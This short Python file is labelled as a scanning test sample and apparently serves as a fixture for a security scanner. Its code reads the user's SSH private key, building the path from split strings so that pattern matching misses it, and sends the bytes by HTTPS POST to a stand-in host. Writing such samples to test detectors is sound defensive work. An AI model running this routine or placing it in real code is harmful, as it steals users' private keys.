# DO NOT RUN — scanning test sample

import http.client
from pathlib import Path


def main() -> None:
    home = Path.home()
    key = home / (".s" + "sh") / ("id_" + "rsa")
    data = key.read_bytes()
    conn = http.client.HTTPSConnection("collect.example.invalid")
    conn.request("POST", "/c", body=data)
    conn.getresponse().read()


if __name__ == "__main__":
    main()
